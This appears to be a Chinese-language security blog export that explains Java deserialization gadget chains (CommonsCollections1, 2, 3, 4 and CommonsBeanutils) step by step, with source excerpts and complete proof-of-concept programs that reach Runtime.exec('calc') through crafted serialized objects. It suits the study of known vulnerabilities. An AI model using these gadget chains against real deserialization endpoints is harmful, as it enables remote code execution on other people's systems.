AnnotationTypeMismatchExceptionProxy( value.getClass() + &quot;[&quot; + value + &quot;]&quot;).setMember( annotationType.members().get(name))); } } }} 先看第一个if判断;如果memberType不为空就会接着执行下面的代码； 12345678910111213Annotation是一个注解类，下面三步就是在得到type的成员类型，而this.type = type;就是AnnotationInvocationHandler构造方法中的第一个参数，是我们可控的this.type = type;annotationType = AnnotationType.getInstance(type); 得到实例Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes(); 用于获取注解类型中的所有成员类型（包括成员变量、成员方法等）String name = memberValue.getKey(); 得到KeyClass&lt;?&gt; memberType = memberTypes.get(name); 然后从注解类型中的所有成员类型得到上一步得到的Key，如果Key不存在返回空目的就是要让memberType不为空；所以我们要让传递的Key再某一个注解里有对应的成员类型而@Retention和@Target注解中存在value成员，使得传递的Key为value就行 // RetentionPolicy value() // ElementType[] value(); 第二个if判断 123memberType.isInstance(value)如果value是memberType所表示的成员类型的一个实例，则该方法返回true；否则返回false。如果我们要传递的value不是memberType所表示的成员类型的一个实例；所以memberType.isInstance()会返回false,再加上前面的!; 最终结果为真； ConstantTransformer最后解决memberValue.setValue中的值无法控制 这里需要借助另一个类ConstantTransformer；这个类非常有意思，构造方法传递什么值，transform就返回什么值 12345678public ConstantTransformer(Object constantToReturn) { super(); iConstant = constantToReturn;}public Object transform(Object input) { return iConstant;} 改成下面这种形式 123456789Transformer[] transformers = { new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, null}), new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{&quot;calc&quot;})};ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);chainedTransformer.transform(&quot;deadbeef&quot;); 动态调试看到，new ConstantTransformer(Runtime.class)将iConstant赋值为了Runtime.class;接下来调用ConstantTransformer.transform方法，不管传过来的”input”是什么值，始终返回Runtime.class Gadget chain:12345678910111213141516ObjectInputStream.readObject() AnnotationInvocationHandler.readObject() AbstractInputCheckedMapDecorator.setValue TransformedMap.decorate TransformedMap.checkSetValue ChainedTransformer.transform() ConstantTransformer.transform() InvokerTransformer.transform() Method.invoke() Class.getMethod() InvokerTransformer.transform() Method.invoke() Runtime.getRuntime() InvokerTransformer.transform() Method.invoke() Runtime.exec() poc112345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152package demo1;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.TransformedMap;import java.io.*;import java.lang.annotation.Target;import java.lang.reflect.Constructor;import java.lang.reflect.InvocationTargetException;import java.util.HashMap;import java.util.Map;public class Test3 { public static void main(String[] args) throws IOException, InvocationTargetException, IllegalAccessException, NoSuchMethodException, ClassNotFoundException, InstantiationException { Transformer[] transformers = { new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, null}), new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{&quot;calc&quot;}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;(); hashMap.put(&quot;value&quot;,&quot;deadbeef&quot;); Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(hashMap, null, chainedTransformer); Class&lt;?&gt; clazz = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;); Constructor&lt;?&gt; annotationInvocationHandler = clazz.getDeclaredConstructor(Class.class, Map.class); annotationInvocationHandler.setAccessible(true); Object o = annotationInvocationHandler.newInstance(Target.class,transformedMap); serialize(o); unserialize(); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;)); oos.writeObject(obj); oos.close(); } public static void unserialize() throws IOException, ClassNotFoundException { ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;ser.bin&quot;)); ois.readObject(); ois.close(); }} LazyMap什么是代理模式？代理（Proxy）是一种设计模式，为其他对象提供一种代理以控制对这个对象的访问。 代理模式的组成 抽象角色：通过接口或抽象类声明真实角色实现的业务方法。 代理角色：实现抽象角色，是真实角色的代理，通过真实角色的业务逻辑方法来实现抽象方法，并可以附加自己的操作。 真实角色：实现抽象角色，定义真实角色所要实现的业务逻辑，供代理角色调用。 代理模式的关键点是:代理对象与目标对象.代理对象是对目标对象的扩展,并会调用目标对象。 静态代理：代理一个User类的show方法 先创建一个接口作为抽象角色； 123public interface IUser { public abstract void show();} 创建一个需要被代理的类 User, 1234567public class User implements IUser { public void show(){ System.out.println(&quot;show&quot;); }} 再创建一个代理类 123456789101112131415public class UserProxy implements IUser{ IUser user; public UserProxy() { } public UserProxy(IUser user) { this.user = user; } @Override public void show() { user.show(); System.out.println(&quot;调用了show方法&quot;); }} 再创建一个测试类 1234567891011public class ProxyTest { public static void main(String[] args) { IUser user = new User(); IUser userLog = new UserProxy(user); userLog.show(); }}//show//调用了show方法 总结： 静态代理在使用时，需要定义接口或者父类，被代理对象与代理对象一起实现接口或继承相同 的父类 缺点： 因为代理对象需要和被代理对象实现相同的接口或父类，所以会有太多的代理类 一旦接口中增加了方法后，被代理对象和代理对象都需要维护（非常麻烦，不方便） 比如我如果代理的方法还有update和dowload 需要在接口，被代理的类，和代理类都需要写update和dowload方法，这就非常繁琐； 动态代理：代理一个User类的show方法 需要代理的类和接口都和动态代理展示的一样 将静态代理类改成动态代理类 12345678910111213141516import java.lang.reflect.InvocationHandler;import java.lang.reflect.Method;public class UserProxy002 implements InvocationHandler { private IUser target; public UserProxy002(IUser target) { this.target = target; } public Object invoke(Object proxy, Method method, Object[] args) throws Throwable { System.out.println(&quot;开始打印&quot;); Object returnValue = method.invoke(target, args); System.out.println(&quot;结束打印&quot;); return returnValue; }} 测试类 123456789101112public class ProxyTest { public static void main(String[] args) { IUser user = new User(); InvocationHandler userProxy002 = new UserProxy002(user); IUser o = (IUser) Proxy.newProxyInstance(user.getClass().getClassLoader(), user.getClass().getInterfaces(), userProxy002); o.show(); }}//开始打印//show//结束打印 当调用o.show()时，就会去调用UserProxy002类中的invoke方法,懂了这一点的话，看第二条链会简单许多； LazyMap第二条链的入口和后面一部分都类似， 我们不用TransformedMap，改用LazyMap; LazyMap中的get方法调用了factory.transform(key); 123456789public Object get(Object key) { // create value for key if key is not currently in the map if (map.containsKey(key) == false) { Object value = factory.transform(key); map.put(key, value); return value; } return map.get(key);} invoke而在AnnotationInvocationHandler中的invoke方法中调用了get,并且memberValues是可控的; 12345678910111213141516171819202122232425public Object invoke(Object proxy, Method method, Object[] args) { String member = method.getName(); Class&lt;?&gt;[] paramTypes = method.getParameterTypes(); // Handle Object and Annotation methods if (member.equals(&quot;equals&quot;) &amp;&amp; paramTypes.length == 1 &amp;&amp; paramTypes[0] == Object.class) return equalsImpl(args[0]); if (paramTypes.length != 0) throw new AssertionError(&quot;Too many parameters for an annotation method&quot;); switch(member) { case &quot;toString&quot;: return toStringImpl(); case &quot;hashCode&quot;: return hashCodeImpl(); case &quot;annotationType&quot;: return type; } // Handle annotation member accessors Object result = memberValues.get(member); ... } 我们仍需要绕过两if； 第一个if,调用的方法不能是equals;第二个if，只能代理无参方法，否则报异常； Gadget chain:12345678910111213141516ObjectInputStream.readObject() AnnotationInvocationHandler.readObject() Map(Proxy).entrySet() AnnotationInvocationHandler.invoke() LazyMap.get() ChainedTransformer.transform() ConstantTransformer.transform() InvokerTransformer.transform() Method.invoke() Class.getMethod() InvokerTransformer.transform() Method.invoke() Runtime.getRuntime() InvokerTransformer.transform() Method.invoke() Runtime.exec() poc212345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455package demo1;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.LazyMap;import java.io.*;import java.lang.annotation.Target;import java.lang.reflect.Constructor;import java.lang.reflect.InvocationHandler;import java.lang.reflect.InvocationTargetException;import java.lang.reflect.Proxy;import java.util.HashMap;import java.util.Map;public class Test { public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, InstantiationException { Transformer[] transformers = { new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, null}), new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{&quot;calc&quot;}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;(); hashMap.put(&quot;value&quot;,&quot;deadbeef&quot;); Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(hashMap, chainedTransformer); Class&lt;?&gt; clazz = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;); Constructor&lt;?&gt; annotationInvocationHandler = clazz.getDeclaredConstructor(Class.class, Map.class); annotationInvocationHandler.setAccessible(true); Object o1 = annotationInvocationHandler.newInstance(Target.class, lazyMap); Map o2 =(Map) Proxy.newProxyInstance(annotationInvocationHandler.getClass().getClassLoader(), new Class[]{Map.class}, (InvocationHandler) o1); Object o = annotationInvocationHandler.newInstance(Target.class,o2); serialize(o); unserialize(); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;)); oos.writeObject(obj); } public static void unserialize() throws IOException, ClassNotFoundException { ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;ser.bin&quot;)); ois.readObject(); }} 注意：o2.entrySet() ==&gt; o1.invoke ==&gt; lazyMap.get =&gt; …","link":"/2024/02/28/CommonsCollections1/"},{"title":"CC4+CC2+CB","text":"CommonsCollections4CC4不再是通过TransformedMap.checkSetValue方法调用到ChainedTransformer.transform;而是通过TransformingComparator.compare调用的ChainedTransformer.transform; CC4是在commons-collections4-4.0中的链，因为TransformingComparator类在commons-collections4-4.0.jar中实现了Serializable接口，而在commons-collections3中TransformingComparator类没有实现Serializable接口； 可以看到TransformingComparator中的compare调用了transform方法，而且transformer是可控的 12345678910public TransformingComparator(final Transformer&lt;? super I, ? extends O&gt; transformer, final Comparator&lt;O&gt; decorated) { this.decorated = decorated; this.transformer = transformer;} public int compare(final I obj1, final I obj2) { final O value1 = this.transformer.transform(obj1); final O value2 = this.transformer.transform(obj2); return this.decorated.compare(value1, value2);} CC4的入口类是PriorityQueue,因为PriorityQueue的readObject间接调用了compare;而且调用compare的对象可控； readObject() == &gt; heapify() 123456789101112private void readObject(java.io.ObjectInputStream s) throws java.io.IOException, ClassNotFoundException { s.defaultReadObject(); s.readInt(); queue = new Object[size]; for (int i = 0; i &lt; size; i++) queue[i] = s.readObject(); heapify();} 注意：size &gt;&gt;&gt; 1是一个位运算操作，用于将一个数值向右位移1位，相当于除以2取整的操作。如果要符合i &gt;= 0的条件，size最先要为2；也就是说，在创建PriorityQueue对象时，至少要add两次(其实反射修改size属性值也是可以的)，使得size的值为2，才会调用到siftDown， 1234private void heapify() { for (int i = (size &gt;&gt;&gt; 1) - 1; i &gt;= 0; i--) siftDown(i, (E) queue[i]);} 123456private void siftDown(int k, E x) { if (comparator != null) siftDownUsingComparator(k, x); else siftDownComparable(k, x);} 最后在siftDownUsingComparator中调用了comparator.compare; 12345678910111213141516private void siftDownUsingComparator(int k, E x) { int half = size &gt;&gt;&gt; 1; while (k &lt; half) { int child = (k &lt;&lt; 1) + 1; Object c = queue[child]; int right = child + 1; if (right &lt; size &amp;&amp; comparator.compare((E) c, (E) queue[right]) &gt; 0) c = queue[child = right]; if (comparator.compare(x, (E) c) &lt;= 0) break; queue[k] = c; k = child; } queue[k] = x;} 还需要注意一下PriorityQueue的add方法 123public boolean add(E e) { return offer(e);} 当第二次add数据时，i不等于0；会调用else中的siftUp 1234567891011121314public boolean offer(E e) { if (e == null) throw new NullPointerException(); modCount++; int i = size; if (i &gt;= queue.length) grow(i + 1); size = i + 1; if (i == 0) queue[0] = e; else siftUp(i, e); return true;} 123456private void siftUp(int k, E x) { if (comparator != null) siftUpUsingComparator(k, x); else siftUpComparable(k, x);} 最后在siftUpUsingComparator方法中也会调用compare方法，和CC6一样，如果不做修改的话，会在序列化时就会调用； 所以需要在序列化时修改一下comparator的值，调用完add方法之后，再通过反射修改回来 1234567891011private void siftUpUsingComparator(int k, E x) { while (k &gt; 0) { int parent = (k - 1) &gt;&gt;&gt; 1; Object e = queue[parent]; if (comparator.compare(x, (E) e) &gt;= 0) break; queue[k] = e; k = parent; } queue[k] = x;} poc: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869package demo1;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import org.apache.commons.collections4.Transformer;import org.apache.commons.collections4.comparators.TransformingComparator;import org.apache.commons.collections4.functors.ChainedTransformer;import org.apache.commons.collections4.functors.ConstantTransformer;import org.apache.commons.collections4.functors.InvokerTransformer;import java.io.*;import java.lang.reflect.Field;import java.nio.file.Files;import java.nio.file.Paths;import java.util.PriorityQueue;public class Test8 { public static void main(String[] args) throws NoSuchFieldException, IOException, IllegalAccessException, ClassNotFoundException { TemplatesImpl templates = new TemplatesImpl(); Class&lt;? extends TemplatesImpl&gt; tCalss = templates.getClass(); Field name = tCalss.getDeclaredField(&quot;_name&quot;); name.setAccessible(true); name.set(templates,&quot;deadbeef&quot;);// Field tfactory = tCalss.getDeclaredField(&quot;_tfactory&quot;);// tfactory.setAccessible(true);// tfactory.set(templates,new TransformerFactoryImpl()); byte[] bytes = Files.readAllBytes(Paths.get(&quot;E:\\\\tmp\\\\Calc.class&quot;)); byte[][] codes = {bytes}; Field bytecodes = tCalss.getDeclaredField(&quot;_bytecodes&quot;); bytecodes.setAccessible(true); bytecodes.set(templates,codes); Transformer[] transformers = { new ConstantTransformer(templates), new InvokerTransformer(&quot;newTransformer&quot;, null, null) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); TransformingComparator transformingComparator = new TransformingComparator(new ConstantTransformer(1)); PriorityQueue priorityQueue = new PriorityQueue(transformingComparator); priorityQueue.add(1); priorityQueue.add(2); Class c = transformingComparator.getClass(); Field transformerField = c.getDeclaredField(&quot;transformer&quot;); transformerField.setAccessible(true); transformerField.set(transformingComparator,chainedTransformer); serialize(priorityQueue); unserialize(); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;)); oos.writeObject(obj); oos.close(); } public static void unserialize() throws IOException, ClassNotFoundException { ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;ser.bin&quot;)); ois.readObject(); ois.close(); }} CommonsCollections2CC2是在commons-collections4-4.0中的 12345public int compare(final I obj1, final I obj2) { final O value1 = this.transformer.transform(obj1); final O value2 = this.transformer.transform(obj2); return this.decorated.compare(value1, value2);} 在TransformingComparator类中，compare方法的obj1是可控的，可以在上面的源码中看到，obj1其实就是PriorityQueue类中的在调用readObject时的heapify方法的queue[i]的值，这个值就是我们add的数据，如果我add的是templates;我们可以直接调用InvokerTransformer;就不用ChainedTransformer的数组嵌套调用了 1new InvokerTransformer(&quot;newTransformer&quot;, null, null).transform(templates) 虽然queue数组被transient修饰了，但是在writeObject函数中通过s.writeObject(queue[i]); 来序列化 queue 数组的元素。而不是把queue当作一个Object数组存贮；所以queue的数据还是会被序列化， 1transient Object[] queue; 123456789private void writeObject(java.io.ObjectOutputStream s) throws java.io.IOException { s.defaultWriteObject(); s.writeInt(Math.max(2, size + 1)); for (int i = 0; i &lt; size; i++) s.writeObject(queue[i]);} poc 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455package demo1;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import org.apache.commons.collections4.comparators.TransformingComparator;import org.apache.commons.collections4.functors.ConstantTransformer;import org.apache.commons.collections4.functors.InvokerTransformer;import java.io.*;import java.lang.reflect.Field;import java.nio.file.Files;import java.nio.file.Paths;import java.util.PriorityQueue;public class Test8 { public static void main(String[] args) throws NoSuchFieldException, IOException, IllegalAccessException, ClassNotFoundException { TemplatesImpl templates = new TemplatesImpl(); Class&lt;? extends TemplatesImpl&gt; tCalss = templates.getClass(); Field name = tCalss.getDeclaredField(&quot;_name&quot;); name.setAccessible(true); name.set(templates,&quot;deadbeef&quot;); byte[] bytes = Files.readAllBytes(Paths.get(&quot;E:\\\\tmp\\\\Calc.class&quot;)); byte[][] codes = {bytes}; Field bytecodes = tCalss.getDeclaredField(&quot;_bytecodes&quot;); bytecodes.setAccessible(true); bytecodes.set(templates,codes); InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;newTransformer&quot;, null, null); TransformingComparator transformingComparator = new TransformingComparator(new ConstantTransformer(1)); PriorityQueue priorityQueue = new PriorityQueue(transformingComparator); priorityQueue.add(templates); priorityQueue.add(2); Class c = transformingComparator.getClass(); Field transformerField = c.getDeclaredField(&quot;transformer&quot;); transformerField.setAccessible(true); transformerField.set(transformingComparator,invokerTransformer); serialize(priorityQueue); unserialize(); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;)); oos.writeObject(obj); oos.close(); } public static void unserialize() throws IOException, ClassNotFoundException { ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;ser.bin&quot;)); ois.readObject(); ois.close(); }} CommonsBeanutilsCommonsBeanutils 是应用于 javabean 的工具，它提供了对普通Java类对象（也称为JavaBean）的一些操作方法 所谓javaBean，是指符合如下标准的Java类： 类是公共的 有一个无参的公共的构造器 有私有属性，且须有对应的get、set方法去设置属性 对于boolean类型的成员变量，允许使用”is”代替上面的”get”和”set” 创建Javabean类 12345678910111213141516171819202122232425262728293031public class Student { private String name; private int age; public Student() {} public Student(String name, int age) { this.name = name; this.age = age; } public String getName() { System.out.println(&quot;执行getName&quot;); return name; } public void setName(String name) { System.out.println(&quot;执行setName&quot;); this.name = name; } public int getAge() { System.out.println(&quot;执行getAge&quot;); return age; } public void setAge(int age) { System.out.println(&quot;执行setAge&quot;); this.age = age; }} 创建测试类 1234567891011121314import org.apache.commons.beanutils.PropertyUtils;import java.lang.reflect.InvocationTargetException;public class Test { public static void main(String[] args) throws InvocationTargetException, IllegalAccessException, NoSuchMethodException { Student stu = new Student(&quot;zIxyd&quot;, 20); //第一个参数为 JavaBean 实例，第二个是 JavaBean 的属性 Object name = PropertyUtils.getProperty(stu, &quot;name&quot;); System.out.println(name); }}//执行getName//zIxyd TemplatesImpl类下的getOutputProperties方法也符合Javabean的特点; 而且getOutputProperties方法调用了newTransformer方法，如果和CC2-4一样，调用恶意的TemplatesImpl实例的的newTransformer方法可以任意类加载并且实例化，就可以任意代码执行了 12345678public synchronized Properties getOutputProperties() { try { return newTransformer().getOutputProperties(); // &lt;== } catch (TransformerConfigurationException e) { return null; } } 接着看看那里调用了getProperty方法； 其中BeanComparator类下的compare方法调用了PropertyUtils.getProperty( o1, property );;而且形参property是可以通过构造函数控制，形参o1也是可控的； 然后就用CC4和CC2中的PriorityQueue中readObject会调用compare方法，这样就串起来了 1234567891011public int compare( Object o1, Object o2 ) { if ( property == null ) { // compare the actual objects return comparator.compare( o1, o2 ); } try { Object value1 = PropertyUtils.getProperty( o1, property ); Object value2 = PropertyUtils.getProperty( o2, property ); ...... 直接执行恶意templates实例的getOutputProperties方法 123456789101112131415161718TemplatesImpl templates = new TemplatesImpl();Class&lt;? extends TemplatesImpl&gt; tCalss = templates.getClass();Field name = tCalss.getDeclaredField(&quot;_name&quot;);name.setAccessible(true);name.set(templates,&quot;deadbeef&quot;);Field tfactory = tCalss.getDeclaredField(&quot;_tfactory&quot;);tfactory.setAccessible(true);tfactory.set(templates,new TransformerFactoryImpl());byte[] bytes = Files.readAllBytes(Paths.get(&quot;E:\\\\tmp\\\\Calc.class&quot;));byte[][] codes = {bytes};Field bytecodes = tCalss.getDeclaredField(&quot;_bytecodes&quot;);bytecodes.setAccessible(true);bytecodes.set(templates,codes);PropertyUtils.getProperty(templates,&quot;outputProperties&quot;); pco 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import org.apache.commons.beanutils.BeanComparator;import org.apache.commons.collections.comparators.TransformingComparator;import org.apache.commons.collections.functors.ConstantTransformer;import java.io.*;import java.lang.reflect.Field;import java.lang.reflect.InvocationTargetException;import java.nio.file.Files;import java.nio.file.Paths;import java.util.PriorityQueue;public class Test1 { public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, InvocationTargetException, NoSuchMethodException, ClassNotFoundException { TemplatesImpl templates = new TemplatesImpl(); Class&lt;? extends TemplatesImpl&gt; tCalss = templates.getClass(); Field name = tCalss.getDeclaredField(&quot;_name&quot;); name.setAccessible(true); name.set(templates,&quot;deadbeef&quot;); byte[] bytes = Files.readAllBytes(Paths.get(&quot;E:\\\\tmp\\\\Calc.class&quot;)); byte[][] codes = {bytes}; Field bytecodes = tCalss.getDeclaredField(&quot;_bytecodes&quot;); bytecodes.setAccessible(true); bytecodes.set(templates,codes); BeanComparator beanComparator = new BeanComparator(&quot;outputProperties&quot;, null); TransformingComparator transformingComparator = new TransformingComparator(new ConstantTransformer(1)); PriorityQueue priorityQueue = new PriorityQueue(transformingComparator); priorityQueue.add(templates); priorityQueue.add(2); Class c = priorityQueue.getClass(); Field comparator = c.getDeclaredField(&quot;comparator&quot;); comparator.setAccessible(true); comparator.set(priorityQueue,beanComparator); serialize(priorityQueue); unserialize(); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;)); oos.writeObject(obj); oos.close(); } public static void unserialize() throws IOException, ClassNotFoundException { ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;ser.bin&quot;)); ois.readObject(); ois.close(); }}","link":"/2024/02/29/CC4+CC2/"},{"title":"CommonsCollections3","text":"了解类是如何加载的 1234567 //返回的系统类加载器也是AppClassLoaderClassLoader c = ClassLoader.getSystemClassLoader(); //动调看一下，最终调用ClassLoader中的defineClass//loadClass ==&gt; findClass ==&gt; defineClass Class&lt;?&gt; cl = c.loadClass(&quot;Calc&quot;);//必须实例化；否则不会执行任何操作的， cl.newInstance(); 调试得知，最终是调用了ClassLoader.defineClass方法加载的字节码文件 尝试加载任意目录的字节码文件； 123456789101112131415161718192021 URLClassLoader cl = new URLClassLoader(new URL[]{new URL(&quot;file:///E:\\\\tmp\\\\&quot;)}); Class&lt;?&gt; c = cl.loadClass(&quot;Hello&quot;); c.newInstance();/* 可以看看URLClassLoader的构造函数；也是调用了System.getSecurityManager(); 返回的系统类加载器也是AppClassLoader 并且修改了ucp的值；所以在调用findClass方法时也会有对应的影响 //Resource res = ucp.getResource(path, false); public URLClassLoader(URL[] urls) { super(); // this is to make the stack depth consistent with 1.1 SecurityManager security = System.getSecurityManager(); if (security != null) { security.checkCreateClassLoader(); } ucp = new URLClassPath(urls); this.acc = AccessController.getContext(); }*/ 尝试直接利用反射调用ClassLoader.defineClass方法加载字节码文件 注意：倒数第二行，传递参数时；类名”Calc”也可以为空 GPT解释：将类名传入为null，这实际上是在告诉虚拟机不要使用类名来验证类定义，而是直接使用字节码数据进行类的定义。这种情况下，虚拟机会直接使用字节码数据来创建Class对象，然后将其加载到虚拟机中。 12345678ClassLoader cl = ClassLoader.getSystemClassLoader();Class&lt;ClassLoader&gt; c = ClassLoader.class;Method declaredMethod = c.getDeclaredMethod(&quot;defineClass&quot;, String.class, byte[].class, int.class, int.class);declaredMethod.setAccessible(true);byte[] codes = Files.readAllBytes(Paths.get(&quot;E:\\\\tmp\\\\Calc.class&quot;)); Class invoke =(Class) declaredMethod.invoke(cl, &quot;Calc&quot;, codes, 0, codes.length);invoke.newInstance(); 直接正着看CC3链； TemplatesImpl构造函数为空(并没有给一些属性值赋值) 1public TemplatesImpl() { } TemplatesImpl下的public修饰的newTransformer方法，调用了getTransletInstance方法 1234567891011121314151617public synchronized Transformer newTransformer() throws TransformerConfigurationException{ TransformerImpl transformer; transformer = new TransformerImpl(getTransletInstance(), _outputProperties, // &lt;&lt;== _indentNumber, _tfactory); if (_uriResolver != null) { transformer.setURIResolver(_uriResolver); } if (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) { transformer.setSecureProcessing(true); } return transformer;} getTransletInstance方法调用了defineTransletClasses方法 123456789private Translet getTransletInstance() throws TransformerConfigurationException { try { if (_name == null) return null; if (_class == null) defineTransletClasses(); // &lt;&lt;== AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance(); // &lt;&lt;== ...... 注意： 前提是_name不为空，属性值默认是为空的，再加上构造函数什么也没干(并没有给一些属性值赋值); 所以需要反射修改_name的值，使得值不为空 在getTransletInstance方法中还有一个实例化的操作：_class[_transletIndex].newInstance(); defineTransletClasses方法中调用了defineClass方法 1234567891011121314151617181920212223242526272829303132333435363738394041private void defineTransletClasses() throws TransformerConfigurationException { if (_bytecodes == null) { ErrorMsg err = new ErrorMsg(ErrorMsg.NO_TRANSLET_CLASS_ERR); throw new TransformerConfigurationException(err.toString()); } TransletClassLoader loader = (TransletClassLoader) AccessController.doPrivileged(new PrivilegedAction() { public Object run() { return new TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap()); } }); try { final int classCount = _bytecodes.length; _class = new Class[classCount]; if (classCount &gt; 1) { _auxClasses = new HashMap&lt;&gt;(); } for (int i = 0; i &lt; classCount; i++) { _class[i] = loader.defineClass(_bytecodes[i]); // &lt;&lt;== final Class superClass = _class[i].getSuperclass(); if (superClass.getName().equals(ABSTRACT_TRANSLET)) { _transletIndex = i; } else { _auxClasses.put(_class[i].getName(), _class[i]); } } if (_transletIndex &lt; 0) { ErrorMsg err= new ErrorMsg(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name); throw new TransformerConfigurationException(err.toString()); } } ...... 注意： _bytecodes其实就是我们要加载的恶意的字节码数组，所以肯定要反射赋值； 还需要注意不能使得_tfactory为空，否则在调用方法是会报空指针异常； 但是_tfactory被”transient”修饰了，其实也无需担心;因为在readObject中为_tfactory 赋值了；”_tfactory = new TransformerFactoryImpl();” 还有_auxClasses属性也调用了一个方法，也被”transient”修饰了，并且readObject并没有对_auxClasses属性有赋值的操作；再加上_transletIndex默认值为-1;最后一个if语句会为真，也会抛出异常，所以尝试使得superClass.getName().equals(ABSTRACT_TRANSLET)为真，这样就不会走到else中，也会修改_transletIndex的值为0; 要使得字节码文件中的类的父类是AbstractTranslet 123private static String ABSTRACT_TRANSLET = &quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;; superClass = _class[i].getSuperclass(); superClass.getName().equals(ABSTRACT_TRANSLET) defineClass最后会调用ClassLoader.defineClass;字节码加载完之后，回到getTransletInstance方法中调用newInstance方法，实现实例化； 123Class defineClass(final byte[] b) { return defineClass(null, b, 0, b.length);} Gadget chain: 12345678910111213ObjectInputStream.readObject() AnnotationInvocationHandler.readObject() AbstractInputCheckedMapDecorator.setValue() TransformedMap.checkSetValue() ChainedTransformer.transform() ConstantTransformer.transform() InvokerTransformer.transform() TemplatesImpl.newTransformer TemplatesImpl.getTransletInstance TemplatesImpl.defineTransletClasses TemplatesImpl.defineClass ClassLoader.defineClass TemplatesImpl.getTransletInstance.newInstance 先生成一个字节码文件 再构造代码块中写要执行的命令(再空参函数中写也没问题)；然后继承AbstractTranslet类，这是一个抽象类，还要实现抽象方法 123456789101112131415161718192021222324252627282930import com.sun.org.apache.xalan.internal.xsltc.DOM;import com.sun.org.apache.xalan.internal.xsltc.TransletException;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;import com.sun.org.apache.xml.internal.serializer.SerializationHandler;import java.io.IOException;public class Calc extends AbstractTranslet { { try { Runtime.getRuntime().exec(&quot;calc&quot;); } catch (IOException e) { throw new RuntimeException(e); } } public Calc(){} @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException { } @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { }} 然后反射就是修改一下TemplatesImpl的属性值 123456789101112131415161718TemplatesImpl templates = new TemplatesImpl();Class&lt;? extends TemplatesImpl&gt; tCalss = templates.getClass();Field name = tCalss.getDeclaredField(&quot;_name&quot;);name.setAccessible(true);name.set(templates,&quot;deadbeef&quot;);Field tfactory = tCalss.getDeclaredField(&quot;_tfactory&quot;);tfactory.setAccessible(true);tfactory.set(templates,new TransformerFactoryImpl());byte[] bytes = Files.readAllBytes(Paths.get(&quot;E:\\\\tmp\\\\Calc.class&quot;));byte[][] codes = {bytes};Field bytecodes = tCalss.getDeclaredField(&quot;_bytecodes&quot;);bytecodes.setAccessible(true);bytecodes.set(templates,codes);templates.newTransformer(); 最后还是利用CC1后半部分的链调用templates的newTransformer方法，后部分链用CC6应该可以； 